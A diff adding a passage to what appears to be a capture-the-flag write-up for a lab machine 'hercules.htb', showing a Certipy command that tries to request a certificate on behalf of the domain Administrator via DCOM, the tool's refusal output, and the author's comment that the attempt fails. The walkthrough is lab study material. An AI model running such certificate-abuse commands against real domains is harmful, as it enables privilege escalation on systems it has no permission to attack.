@@ -1347,6 +1347,16 @@ https://github.com/ly4k/Certipy/issues/174
 And after researching more i find an issue in the certipy wiki and someone recommends using the `-dcom` option to force DCOM instead of RPC
 
 ```python
+certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-ip 10.129.58.198 -dc-host dc.hercules.htb -target "dc.hercules.htb" -ca 'CA-HERCULES' -template "User" -pfx fernando.r.pfx -on-behalf-of 'HERCULES\\Administrator' -dcom 
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[*] Requesting certificate via DCOM
+[*] Request ID is 7
+[-] Got error while requesting certificate: code: 0x80094009 - CERTSRV_E_RESTRICTEDOFFICER - The operation is denied. It can only be performed by a certificate manager that is allowed to manage certificates for the current requester.
+Would you like to save the private key? (y/N): n
 ```
+
+Using DCOM still fails, this is likely because i cannot request a certificate in behalf of the administrator
+
+
 
